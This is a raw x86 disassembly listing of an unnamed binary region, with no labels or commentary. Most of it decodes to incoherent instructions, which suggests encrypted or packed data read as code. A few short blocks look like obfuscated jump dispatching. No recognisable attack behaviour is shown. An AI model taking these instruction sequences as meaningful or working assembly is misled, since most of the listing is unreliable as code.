  40b259:	mov    edx,0xe52c7fb4
  40b25e:	(bad)  
  40b25f:	fs es add al,0x8a
  40b263:	std    
  40b264:	jo     0x40b283
  40b266:	inc    esp
  40b267:	daa    
  40b268:	adc    DWORD PTR [ebx],ecx
  40b26a:	fnstcw WORD PTR [eax]
  40b26c:	mov    DWORD PTR [edx],esp
  40b26e:	cmp    dh,bh
  40b270:	or     eax,0xcf3dc2b2
  40b275:	sar    DWORD PTR [ebx-0x34],cl
  40b278:	sbb    BYTE PTR [edx-0x4b],bl
  40b27b:	xchg   BYTE PTR [ebp+0x60],cl
  40b27e:	and    BYTE PTR [edi],cl
  40b280:	jns    0x40b279
  40b282:	scas   eax,DWORD PTR es:[edi]
  40b283:	aaa    
  40b284:	sbb    BYTE PTR [ebx+0xe],dh
  40b287:	leave  
  40b288:	imul   esp,ebp,0xd745dda5
  40b28e:	or     al,0x6b
  40b290:	(bad)  
  40b291:	and    bh,dh
  40b293:	mov    eax,ds:0xfcd0ebe9
  40b298:	xchg   DWORD PTR [ecx+0x5bbb7bdf],edx
  40b29e:	mov    al,ds:0x246bb336
  40b2a3:	pushf  
  40b2a4:	int3   
  40b2a5:	stos   BYTE PTR es:[edi],al
  40b2a6:	cld    
  40b2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2a8:	daa    
  40b2a9:	cli    
  40b2aa:	push   cs
  40b2ab:	jp     0x40b268
  40b2ad:	sbb    BYTE PTR [ecx],cl
  40b2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b0:	xor    edx,edi
  40b2b2:	(bad)  
  40b2b3:	pop    esp
  40b2b4:	ins    DWORD PTR es:[edi],dx
  40b2b5:	xchg   DWORD PTR [ebp-0x76],ebx
  40b2b8:	and    BYTE PTR [ebx+0x13],cl
  40b2bb:	mov    ds:0xbec88652,eax
  40b2c0:	test   DWORD PTR [eax+0x6d],ecx
  40b2c3:	(bad)  
  40b2c4:	lds    esp,FWORD PTR [edx-0x40]
  40b2c7:	xor    BYTE PTR [ecx],0x9b
  40b2ca:	mov    eax,ds:0x7c9a767
  40b2cf:	in     eax,dx
  40b2d0:	dec    esp
  40b2d1:	mov    ds:0x9bb2f74,al
  40b2d6:	or     edx,DWORD PTR ds:0xee745d88
  40b2dc:	jmp    0x20730d02
  40b2e1:	jp     0x40b288
  40b2e3:	jecxz  0x40b2b9
  40b2e5:	mov    WORD PTR [edi-0x6df436e],ss
  40b2eb:	push   esp
  40b2ec:	ret    0xd35f
  40b2ef:	cli    
  40b2f0:	arpl   WORD PTR [esi+0x5b],si
  40b2f3:	and    al,0x3d
  40b2f5:	test   DWORD PTR gs:[esi-0x62],0x6147b074
  40b2fd:	or     eax,0x34697416
  40b302:	mov    bl,0xbc
  40b304:	sbb    BYTE PTR [eax+0x6c],0xdb
  40b308:	push   esi
  40b309:	(bad)  
  40b30a:	es push esi
  40b30c:	ss scas al,BYTE PTR es:[edi]
  40b30e:	scas   al,BYTE PTR es:[edi]
  40b30f:	stos   DWORD PTR es:[edi],eax
  40b310:	cmp    al,0x27
  40b312:	jne    0x40b2b3
  40b314:	call   0xd32b:0x914a661f
  40b31b:	adc    al,0x75
  40b31d:	ds add al,0x81
  40b320:	add    ebx,DWORD PTR [ebp-0x15233dff]
  40b326:	pop    ebx
  40b327:	iret   
  40b328:	jns    0x40b3a2
  40b32a:	mov    eax,?
  40b32c:	dec    esp
  40b32d:	mov    DWORD PTR [eax+0x3428b922],ebp
  40b333:	aad    0xa7
  40b335:	imul   ecx,DWORD PTR [eax+ebx*2+0x72],0xfffffff7
  40b33a:	push   edi
  40b33b:	pusha  
  40b33c:	call   0x2e7ebd0f
  40b341:	xchg   DWORD PTR [eax],edx
  40b343:	or     ebx,0xf
  40b346:	jge    0x40b399
  40b348:	cmp    al,0x51
  40b34a:	fs ret 0xfb81
  40b34e:	test   DWORD PTR [edx],ebp
  40b350:	in     al,0xc2
  40b352:	loopne 0x40b35c
  40b354:	sar    DWORD PTR [ecx+0x29],0xa7
  40b358:	add    dh,BYTE PTR [ecx]
  40b35a:	fisttp DWORD PTR [eax+edx*1]
  40b35d:	and    ecx,DWORD PTR [eax+eax*4]
  40b360:	icebp  
  40b361:	xchg   edi,eax
  40b362:	push   ds
  40b363:	xchg   bp,ax
  40b365:	push   esp
  40b366:	outs   dx,BYTE PTR ds:[esi]
  40b367:	mov    ch,0x54
  40b369:	xchg   ebp,eax
  40b36a:	lahf   
  40b36b:	xor    eax,0x67f8c9b0
  40b370:	and    ch,al
  40b372:	int3   
  40b373:	in     eax,dx
  40b374:	pop    ds
  40b375:	mov    DWORD PTR [ecx-0x9],ebx
  40b378:	(bad)  
  40b379:	xchg   esi,eax
  40b37a:	fcom   QWORD PTR [eax-0x69799ae]
  40b380:	sub    ebp,DWORD PTR [eax-0x41]
  40b383:	xchg   ebx,eax
  40b384:	push   ss
  40b385:	mov    cl,0xea
  40b387:	sar    bl,cl
  40b389:	mov    ebx,0x5238ad2b
  40b38e:	xchg   edi,eax
  40b38f:	pop    edi
  40b390:	call   0xfcb9:0x50313bf0
  40b397:	iret   
  40b398:	xor    ecx,DWORD PTR [ebx+edi*4-0x17]
  40b39c:	mov    DWORD PTR [edi+0x3b],ebp
  40b39f:	sti    
  40b3a0:	daa    
  40b3a1:	pop    ecx
  40b3a2:	xchg   ecx,eax
  40b3a3:	dec    edx
  40b3a4:	mov    ds:0xcead433d,al
  40b3a9:	adc    DWORD PTR [esi+eiz*2+0x6f],ebp
  40b3ad:	sahf   
  40b3ae:	xchg   esi,eax
  40b3af:	repnz push ecx
  40b3b1:	sub    dh,0xe4
  40b3b4:	xor    DWORD PTR [edi],ecx
  40b3b6:	cmp    eax,0x103c82c6
  40b3bb:	xchg   esp,eax
  40b3bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3bd:	std    
  40b3be:	sbb    al,BYTE PTR [esi-0x190ec32c]
  40b3c4:	xlat   BYTE PTR ds:[ebx]
  40b3c5:	and    eax,0x4b628fcf
  40b3ca:	scas   al,BYTE PTR es:[edi]
  40b3cb:	call   0xb64d:0x5ef30bbf
  40b3d2:	xchg   edi,eax
  40b3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3d4:	fcomp  QWORD PTR [ebx]
  40b3d6:	out    0xe1,eax
  40b3d8:	leave  
  40b3d9:	call   0x8e8a:0xc8f68695
  40b3e0:	das    
  40b3e1:	aaa    
  40b3e2:	add    al,BYTE PTR [ecx+0x6b]
  40b3e5:	mov    dh,cl
  40b3e7:	mov    dh,0xd3
  40b3e9:	cmp    BYTE PTR [edi+0x4e],bl
  40b3ec:	rol    BYTE PTR [eax+0x6c],cl
  40b3ef:	or     BYTE PTR [ebx],0xcd
  40b3f2:	or     ebp,DWORD PTR [ebx-0x674df7f7]
  40b3f8:	jae    0x40b3f5
  40b3fa:	inc    edi
  40b3fb:	aad    0x73
  40b3fd:	lods   al,BYTE PTR ds:[esi]
  40b3fe:	scas   al,BYTE PTR es:[edi]
  40b3ff:	mov    esp,0x160797ea
  40b404:	loopne 0x40b46f
  40b406:	int    0xbb
  40b408:	jl     0x40b3bd
  40b40a:	mov    bh,0x5b
  40b40c:	frstor [edi+0x15]
  40b40f:	lea    edi,[eax+ebx*8+0x3d9c4a43]
  40b416:	cli    
  40b417:	jle    0x40b3a1
  40b419:	push   eax
  40b41a:	xlat   BYTE PTR ds:[ebx]
  40b41b:	out    0x6d,al
  40b41d:	aas    
  40b41e:	push   esi
  40b41f:	cld    
  40b420:	cmp    DWORD PTR [eax+0x3e],eax
  40b423:	fcom   DWORD PTR [ebx-0x14da8c07]
  40b429:	push   cs
  40b42a:	dec    esp
  40b42b:	add    eax,0x5dee4237
  40b430:	data16 or al,0xd5
  40b433:	cmp    cl,BYTE PTR [ecx+ebp*8+0x987e0de]
  40b43a:	xchg   al,dh
  40b43c:	mov    ecx,0x87d09bd2
  40b441:	(bad)  
  40b442:	aas    
  40b443:	sbb    esp,esp
  40b445:	sahf   
  40b446:	fwait
  40b447:	iret   
  40b448:	mov    dl,0x6d
  40b44a:	adc    BYTE PTR [esi+0x4746266],al
  40b450:	mov    ch,0xaa
  40b452:	vpsubusw ymm0,ymm0,YMMWORD PTR [ebp+0x181a2350]
  40b45a:	out    dx,al
  40b45b:	and    eax,0xf5e07a06
  40b460:	jb     0x40b416
  40b462:	in     al,0xd0
  40b464:	nop
  40b465:	outs   dx,DWORD PTR ds:[esi]
  40b466:	pusha  
  40b467:	or     esp,DWORD PTR [ebx]
  40b469:	push   ds
  40b46a:	or     al,0xe6
  40b46c:	dec    ebp
  40b46d:	adc    dl,bl
  40b46f:	xor    al,0x69
  40b471:	and    DWORD PTR [esi-0x2a9228df],ebp
  40b477:	sbb    al,0x9f
  40b479:	pop    ecx
  40b47a:	repnz or al,0xa1
  40b47d:	shr    DWORD PTR [ebx+0x7683080a],1
  40b483:	int3   
  40b484:	jp     0x40b424
  40b486:	outs   dx,BYTE PTR ds:[esi]
  40b487:	mov    bl,0x96
  40b489:	dec    edi
  40b48a:	sbb    DWORD PTR [bp+si],ecx
  40b48d:	and    cl,BYTE PTR [ebx+ecx*8]
  40b490:	fsub   QWORD PTR [ecx-0x24]
  40b493:	mov    ebp,0x75d5333e
  40b498:	jecxz  0x40b4bd
  40b49a:	out    0xaa,eax
  40b49c:	xchg   edx,eax
  40b49d:	clc    
  40b49e:	leave  
  40b49f:	xchg   esi,esi
  40b4a1:	das    
  40b4a2:	mov    cl,0x70
  40b4a4:	xchg   ch,ah
  40b4a6:	jb     0x40b514
  40b4a8:	inc    BYTE PTR [edi]
  40b4aa:	mov    eax,DWORD PTR [ebx-0x43]
  40b4ad:	cmp    ah,BYTE PTR [ecx]
  40b4af:	(bad)  
  40b4b0:	into   
  40b4b1:	dec    eax
  40b4b2:	add    esi,DWORD PTR [ebp+0x6e]
  40b4b5:	out    dx,eax
  40b4b6:	mov    esi,0xa15f3b2d
  40b4bb:	push   edx
  40b4bc:	adc    al,0x7
  40b4be:	mov    bl,0xd7
  40b4c0:	neg    BYTE PTR [ebx+0x13]
  40b4c3:	xchg   ecx,eax
  40b4c4:	or     ecx,DWORD PTR [ebx+0x702b3bc5]
  40b4ca:	xchg   esp,eax
  40b4cb:	je     0x40b451
  40b4cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4ce:	out    0xec,al
  40b4d0:	add    ebx,eax
  40b4d2:	call   0x9a22:0x26fb99aa
  40b4d9:	aaa    
  40b4da:	out    dx,al
  40b4db:	or     eax,DWORD PTR [ebp+0x7f18dce9]
  40b4e1:	xchg   esi,eax
  40b4e2:	mov    bl,0xf8
  40b4e4:	sub    edx,ebx
  40b4e6:	jo     0x40b566
  40b4e8:	mov    esp,0xf7c3321b
  40b4ed:	mov    edi,0x5ebaf726
  40b4f2:	mov    ecx,esp
  40b4f4:	push   esi
  40b4f5:	mov    ebp,0x78c67920
  40b4fa:	jecxz  0x40b545
  40b4fc:	pop    eax
  40b4fd:	mov    eax,0xb2bbb9d6
  40b502:	adc    edx,DWORD PTR [ebp-0x4eb7cd7b]
  40b508:	call   0xec69:0x951fae3a
  40b50f:	iret   
  40b510:	jle    0x40b4a2
  40b512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b513:	call   0x11f4:0xd1579456
  40b51a:	addr16 adc al,0xdc
  40b51d:	add    ah,dl
  40b51f:	cmp    eax,0x8bd7af0f
  40b524:	jge    0x40b51e
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	cmp    al,0x45
  40b551:	pop    eax
  40b552:	jge    0x40b515
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b5b1
  40b55c:	gs dec esi
  40b55e:	sbb    dh,BYTE PTR [ecx]
  40b560:	inc    ecx
  40b561:	xor    eax,0x464e82d6
  40b566:	test   eax,0x59eec8fa
  40b56b:	cdq    
  40b56c:	push   es
  40b56d:	sahf   
  40b56e:	ja     0x40b561
  40b570:	and    BYTE PTR ss:[ecx-0x5d5b3020],cl
  40b577:	mov    ebp,0xc0c8f4f1
  40b57c:	imul   esi,DWORD PTR ds:0xf983780c,0x24
  40b583:	lods   eax,DWORD PTR ds:[esi]
  40b584:	pop    ds
  40b585:	repz pop ss
  40b587:	dec    ebx
  40b588:	mov    esi,0x23fc47a6
  40b58d:	cmp    al,0xfe
  40b58f:	dec    edi
  40b590:	sub    al,0xc4
  40b592:	jo     0x40b5d0
  40b594:	das    
  40b595:	out    0x2a,eax
  40b597:	leave  
  40b598:	mov    al,0x73
  40b59a:	xchg   DWORD PTR [esi-0x74],ecx
  40b59d:	mov    bl,0x4d
  40b59f:	and    dh,BYTE PTR [edi]
  40b5a1:	sub    BYTE PTR [edi+0x7dba89d6],al
  40b5a7:	sbb    al,0xa
  40b5a9:	cmp    BYTE PTR [ecx+edi*2-0x3],ch
  40b5ad:	xchg   ecx,eax
  40b5ae:	push   0x25af1b73
  40b5b3:	inc    edi
  40b5b4:	add    esi,DWORD PTR [ecx+0x789ddda1]
  40b5ba:	inc    ebp
  40b5bb:	fsub   QWORD PTR ds:0xd8c6260f
  40b5c1:	rol    DWORD PTR [edi+eax*2+0x4c],0x94
  40b5c6:	xchg   esp,eax
  40b5c7:	mov    gs,WORD PTR [ecx]
  40b5c9:	push   ebp
  40b5ca:	test   DWORD PTR fs:[ebp-0x72],esp
  40b5ce:	add    al,0x46
  40b5d0:	fsubr  st,st(7)
  40b5d2:	loop   0x40b5ee
  40b5d4:	push   0x19
  40b5d6:	and    DWORD PTR [ecx-0x2192b159],esp
  40b5dc:	retf   0x335e
  40b5df:	dec    esi
  40b5e0:	push   0xebc0eea5
  40b5e5:	push   0xfffffffe
  40b5e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5e8:	mov    eax,0x5022d95d
  40b5ed:	inc    edi
  40b5ee:	into   
  40b5ef:	imul   edi,DWORD PTR [ebx+0x54],0xfdbcfc7e
  40b5f6:	iret   
  40b5f7:	xor    eax,0x2e43a83d
  40b5fc:	fdiv   st(3),st
  40b5fe:	jmp    0x40b667
  40b600:	test   eax,0xa97b076
  40b605:	in     al,0x63
  40b607:	shl    DWORD PTR [ebp+edx*2+0x61],cl
  40b60b:	pusha  
  40b60c:	inc    ecx
  40b60d:	mov    ds:0x21e3d061,al
  40b612:	dec    esi
  40b613:	aad    0xd3
  40b615:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b617:	or     ah,BYTE PTR [esi]
  40b619:	mov    edi,0xcda772da
  40b61e:	mov    cl,0x46
  40b620:	mov    edi,0x92cca2f2
  40b625:	shl    BYTE PTR [edx],cl
  40b627:	dec    edi
  40b628:	inc    ebx
  40b629:	rcr    BYTE PTR [esp+ebx*2],1
  40b62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b62d:	xchg   esi,eax
  40b62e:	dec    ecx
  40b62f:	nop
  40b630:	mov    WORD PTR [ebp-0x3a],ss
  40b633:	add    eax,0xffffff88
  40b636:	jmp    0x40b644
  40b638:	jle    0x40b675
  40b63a:	test   BYTE PTR [edx],ah
  40b63c:	sub    ebp,DWORD PTR [ecx-0x9]
  40b63f:	push   ecx
  40b640:	(bad)  
  40b641:	in     eax,dx
  40b642:	pusha  
  40b643:	cmp    edi,DWORD PTR [ecx+0x58]
  40b646:	stos   BYTE PTR es:[edi],al
  40b647:	ret    0xd696
  40b64a:	sbb    BYTE PTR [ebp+0x6909bf42],0x3b
  40b651:	lock cmp bl,BYTE PTR [edx-0xf]
  40b655:	(bad)  
  40b656:	lea    esi,[ebp*4-0x142f17de]
  40b65d:	and    edx,0xffffffc3
  40b660:	and    al,0x71
  40b662:	loop   0x40b614
  40b664:	rcr    DWORD PTR [edx+edx*1+0x512c30ad],0xf6
  40b66c:	pusha  
  40b66d:	retf   0xc61c
  40b670:	add    ecx,ebp
  40b672:	or     BYTE PTR [edi+esi*8+0x6f],0x6c
  40b677:	out    0xbb,eax
  40b679:	lea    ebp,[esi-0x5]
  40b67c:	jnp    0x40b67b
  40b67e:	adc    al,0x86
  40b680:	jnp    0x40b6a0
  40b682:	cmp    BYTE PTR [eax+0x1005f485],0x12
  40b689:	and    eax,0xf9bb4168
  40b68e:	adc    BYTE PTR [ebx-0x2a],bl
  40b691:	imul   ebp,DWORD PTR [ecx+0x3ac570b7],0xfffffff6
  40b698:	fidiv  WORD PTR [ebp-0x767da345]
  40b69e:	jno    0x40b624
  40b6a0:	push   ebx
  40b6a1:	dec    esi
  40b6a2:	or     ebp,esi
  40b6a4:	arpl   WORD PTR [esi-0x25],ax
  40b6a7:	das    
  40b6a8:	mov    edx,0xbe7dbdb0
  40b6ad:	jg     0x40b644
  40b6af:	mov    al,ds:0x69b33e68
  40b6b4:	jb     0x40b6e2
  40b6b6:	retf   0x6f4f
  40b6b9:	sub    al,0x23
  40b6bb:	call   FWORD PTR [eax-0x31fbeb1b]
  40b6c1:	out    0xa4,al
  40b6c3:	leave  
  40b6c4:	jle    0x40b656
  40b6c6:	fld    QWORD PTR [eax-0x3d0530af]
  40b6cc:	and    cl,BYTE PTR [edx+0x59]
  40b6cf:	aad    0x2b
  40b6d1:	jns    0x40b65a
  40b6d3:	in     eax,dx
  40b6d4:	or     DWORD PTR ds:0x47d99159,edi
  40b6da:	lahf   
  40b6db:	jle    0x40b6ba
  40b6dd:	sub    eax,0x1e542aef
  40b6e2:	jecxz  0x40b66c
  40b6e4:	inc    esi
  40b6e5:	jae    0x40b6de
  40b6e7:	ror    DWORD PTR [eax],cl
  40b6e9:	mov    esp,0xd64d42fe
  40b6ee:	xor    eax,0x814f8478
  40b6f3:	or     BYTE PTR ds:0xc00a60d7,dl
  40b6f9:	inc    edi
  40b6fa:	dec    ecx
  40b6fb:	dec    esi
  40b6fc:	xor    ecx,ebp
  40b6fe:	loopne 0x40b694
  40b700:	hlt    
  40b701:	or     eax,0xa6a6522d
  40b706:	idiv   DWORD PTR [ebx]
  40b708:	icebp  
  40b709:	jb     0x40b6a3
  40b70b:	lods   eax,DWORD PTR ds:[esi]
  40b70c:	repnz test DWORD PTR [ecx],eax
  40b70f:	mov    bl,0x3
  40b711:	out    0xd,al
  40b713:	cmp    cl,BYTE PTR [edx+0x5c]
  40b716:	mov    cs,WORD PTR [ecx]
  40b718:	mov    bl,0xd0
  40b71a:	sbb    al,0xfb
  40b71c:	mov    DWORD PTR ds:0x17dabe21,esp
  40b722:	loopne 0x40b75c
  40b724:	stos   BYTE PTR es:[edi],al
  40b725:	iret   
  40b726:	test   ebx,ecx
  40b728:	outs   dx,DWORD PTR ds:[esi]
  40b729:	adc    eax,DWORD PTR [ebx]
  40b72b:	in     al,dx
  40b72c:	call   0xb77a40b5
  40b731:	sub    al,BYTE PTR [ecx+0x1d]
  40b734:	data16 or BYTE PTR [esi-0x120bd306],cl
  40b73b:	push   es
  40b73c:	loope  0x40b74d
  40b73e:	jecxz  0x40b723
  40b740:	ret    
  40b741:	cmp    DWORD PTR [esp+ebp*2],ecx
  40b744:	jae    0x40b70b
  40b746:	dec    eax
  40b747:	mov    edi,0xecf6ebe3
  40b74c:	sub    cl,BYTE PTR [edx+0xf0a1122]
  40b752:	std    
  40b753:	ret    
  40b754:	mov    esp,0x7ca4c04f
  40b759:	mov    edi,0x744b7bd3
  40b75e:	int3   
  40b75f:	das    
  40b760:	hlt    
  40b761:	cmp    ebp,edx
  40b763:	adc    BYTE PTR [edx+0x4fc8a479],ch
  40b769:	int    0xdc
  40b76b:	dec    ecx
  40b76c:	sbb    BYTE PTR [ebp+esi*4+0x18],0xae
  40b771:	push   edi
  40b772:	dec    ecx
  40b773:	push   esp
  40b774:	out    0xfd,eax
  40b776:	push   es
  40b777:	jno    0x40b7f3
  40b779:	dec    eax
  40b77a:	sub    al,0xd
  40b77c:	push   ebp
  40b77d:	push   ss
  40b77e:	and    BYTE PTR [ebx-0x4ef2bcc3],al
  40b784:	dec    esp
  40b785:	mov    ds:0x93a7986b,al
  40b78a:	and    al,BYTE PTR [edx-0x597e9a34]
  40b790:	sub    BYTE PTR [ebx],ch
  40b792:	aam    0x3a
  40b794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b795:	xchg   edi,eax
  40b796:	test   eax,0xfce5cc41
  40b79b:	add    edi,ecx
  40b79d:	hlt    
  40b79e:	fnstcw WORD PTR [eax-0x44]
  40b7a1:	push   esi
  40b7a2:	pop    ebp
  40b7a3:	push   0x5cb80c48
  40b7a8:	jbe    0x40b821
  40b7aa:	out    0x48,eax
  40b7ac:	inc    ebx
  40b7ad:	mov    cl,0x61
  40b7af:	xchg   ebp,eax
  40b7b0:	(bad)  
  40b7b2:	ret    
  40b7b3:	test   DWORD PTR [eax],edi
  40b7b5:	pop    es
  40b7b6:	and    BYTE PTR [ebx-0x2d],bh
  40b7b9:	sub    BYTE PTR [edi-0x4e7e27a8],dh
  40b7bf:	call   0xc970:0x99ced5cf
  40b7c6:	out    0xd4,al
  40b7c8:	push   0x6
  40b7ca:	(bad)  
  40b7cb:	(bad)  
  40b7cc:	and    eax,0x7e42a812
  40b7d1:	pop    esp
  40b7d2:	in     al,0xfb
  40b7d4:	xchg   ebp,eax
  40b7d5:	or     eax,0x993ff4e1
  40b7da:	xlat   BYTE PTR ds:[ebx]
  40b7db:	int    0x71
  40b7dd:	pop    ecx
  40b7de:	adc    ebp,ecx
  40b7e0:	popa   
  40b7e1:	unpckhps xmm3,xmm4
  40b7e4:	jl     0x40b820
  40b7e6:	scas   eax,DWORD PTR es:[edi]
  40b7e7:	add    dl,bh
  40b7e9:	in     al,dx
  40b7ea:	fnsave [edi+0x3a]
  40b7ed:	lock or ecx,DWORD PTR ds:0xfbae2e95
  40b7f4:	scas   eax,DWORD PTR es:[edi]
  40b7f5:	inc    ebx
  40b7f6:	and    esp,DWORD PTR [eax-0x44540ff4]
  40b7fc:	imul   eax,DWORD PTR [ecx],0x0
  40b7ff:	inc    edx
  40b800:	out    dx,eax
  40b801:	or     cl,dl
  40b803:	sbb    eax,0x76fce56b
  40b808:	ret    
  40b809:	jmp    0x40b7eb
  40b80b:	sti    
  40b80c:	clc    
  40b80d:	sbb    DWORD PTR [edx-0x22150e2b],0x88c34f43
  40b817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b819:	ja     0x40b86c
  40b81b:	dec    ecx
  40b81c:	fld    DWORD PTR [ebp-0x33f8fdde]
  40b822:	bnd jb 0x40b807
  40b825:	push   ss
  40b826:	lds    eax,FWORD PTR [ebp+0x3d944e51]
  40b82c:	xor    dl,bh
  40b82e:	mov    esp,DWORD PTR [ebp+0x46bacf7]
  40b834:	addr16 es mov edi,0x65ebdd4
  40b83b:	dec    esp
  40b83c:	in     eax,0x73
  40b83e:	jb     0x40b7db
  40b840:	sbb    eax,0xf0d59c49
  40b845:	mov    ch,0x63
  40b847:	add    BYTE PTR [ebx],0x8c
  40b84a:	adc    al,0x84
  40b84c:	add    al,0x8a
  40b84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b84f:	(bad)
  40b852:	jmp    0xd090f293
  40b857:	or     DWORD PTR [edx-0x32],0xffffff8e
  40b85b:	out    0x17,al
  40b85d:	aam    0x6
  40b85f:	add    BYTE PTR [ebx+0x6e],bh
  40b862:	sub    ah,BYTE PTR ss:[eax+0x3f]
  40b866:	sbb    eax,0x28e6bc57
  40b86b:	pop    ds
  40b86c:	icebp  
  40b86d:	pcmpeqb mm0,QWORD PTR [edx+0x29]
  40b871:	push   eax
  40b872:	jno    0x40b8c9
  40b874:	dec    edi
  40b875:	ret    0x119d
  40b878:	retf   0xaf51
  40b87b:	jle    0x40b892
  40b87d:	push   ebx
  40b87e:	jge    0x40b8e5
  40b880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b881:	push   ss
  40b882:	inc    edx
  40b883:	dec    edi
  40b884:	pop    ss
  40b885:	aaa    
  40b886:	out    0xa7,eax
  40b888:	mov    dh,0x9a
  40b88a:	stc    
  40b88b:	jg     0x40b824
  40b88d:	idiv   BYTE PTR [eax+0x7c5fac28]
  40b893:	rol    DWORD PTR [eax+edi*4],cl
  40b896:	inc    edi
  40b897:	mov    DWORD PTR [edx-0x199c32fd],ecx
  40b89d:	add    BYTE PTR [esi-0x1a],ch
  40b8a0:	in     eax,0x52
  40b8a2:	frstor [eax+0x57]
  40b8a5:	imul   ebp,DWORD PTR ds:0x93ee0a50,0x6
  40b8ac:	daa    
  40b8ad:	jmp    0x40b8c9
  40b8af:	adc    esp,DWORD PTR ds:0x89de6fd6
  40b8b5:	(bad)  
  40b8b6:	xchg   esp,eax
  40b8b7:	push   edx
  40b8b8:	inc    esi
  40b8b9:	call   0x2f9ec3e4
  40b8be:	jecxz  0x40b8ba
  40b8c0:	imul   ebp,ecx,0x628c3fec
  40b8c6:	jmp    0x40b911
  40b8c8:	xor    ecx,edx
  40b8ca:	xlat   BYTE PTR ds:[ebx]
  40b8cb:	push   eax
  40b8cc:	mov    dh,BYTE PTR [ecx-0x40]
  40b8cf:	das    
  40b8d0:	aaa    
  40b8d1:	je     0x40b933
  40b8d3:	sbb    DWORD PTR [ebp+0x17fb4df0],eax
  40b8d9:	mov    ecx,0xa3de57ce
  40b8de:	cld    
  40b8df:	ficomp DWORD PTR [edx-0x4e]
  40b8e2:	rol    BYTE PTR [ebp+0xd5f103d],0xea
  40b8e9:	sbb    DWORD PTR [ecx-0x2a],eax
  40b8ec:	ret    
  40b8ed:	data16 (bad) 
  40b8f0:	push   esi
  40b8f1:	call   0x5b01:0x688b90c8
  40b8f8:	retf   0xeb0b
  40b8fb:	cdq    
  40b8fc:	mov    edi,DWORD PTR [ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x4d2e66fb],cl
  40b949:	inc    eax
  40b94a:	mov    WORD PTR [eax-0x7d],fs
  40b94d:	jo     0x40b9bf
  40b94f:	lahf   
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b94f
  40b954:	mov    ecx,0x36942505
  40b959:	pop    ebx
  40b95a:	mov    WORD PTR [edi+0x4b],es
  40b95d:	mov    bh,0xc6
  40b95f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b960:	ret    
  40b961:	pop    esp
  40b962:	pop    ds
  40b963:	mov    ds:0xb9737a9,eax
  40b968:	jp     0x40b9a5
  40b96a:	call   0x1d06ff40
  40b96f:	dec    ecx
  40b970:	aas    
  40b971:	or     al,0x1d
  40b973:	fdivr  st,st(7)
  40b975:	ds in  al,0x90
  40b978:	shr    DWORD PTR [esi+0x16],cl
  40b97b:	pop    esp
  40b97c:	fidiv  DWORD PTR [eax]
  40b97e:	push   ebx
  40b97f:	hlt    
  40b980:	arpl   WORD PTR [ebp+0x2d],ax
  40b983:	add    DWORD PTR [edx-0x4b],edi
  40b986:	jae    0x40b931
  40b988:	jnp    0x40b91f
  40b98a:	xor    al,0x1c
  40b98c:	cli    
  40b98d:	adc    dh,BYTE PTR [edx]
  40b98f:	bound  esp,QWORD PTR [ebx+0x52]
  40b992:	lahf   
  40b993:	aaa    
  40b994:	xchg   edx,eax
  40b995:	mov    cl,bh
  40b997:	sub    bl,bl
  40b999:	and    eax,0x9f526385
  40b99e:	repz cmp ah,BYTE PTR [esi-0x7895449c]
  40b9a5:	xchg   edx,eax
  40b9a6:	push   ss
  40b9a7:	xchg   BYTE PTR [ecx+edi*1],dl
  40b9aa:	dec    eax
  40b9ab:	clc    
  40b9ac:	lods   al,BYTE PTR ds:[esi]
  40b9ad:	jo     0x40b950
  40b9af:	mov    al,0xdb
  40b9b1:	push   cs
  40b9b2:	ret    0xdfb8
  40b9b5:	je     0x40b943
  40b9b7:	adc    bh,dl
  40b9b9:	pop    edi
  40b9ba:	test   DWORD PTR [edx+edx*2-0x37],ecx
  40b9be:	pop    ebx
  40b9bf:	popf   
  40b9c0:	xchg   edi,eax
  40b9c1:	xchg   edx,eax
  40b9c2:	repz add BYTE PTR [edi+0x5f],dl
  40b9c6:	cmp    al,0xd2
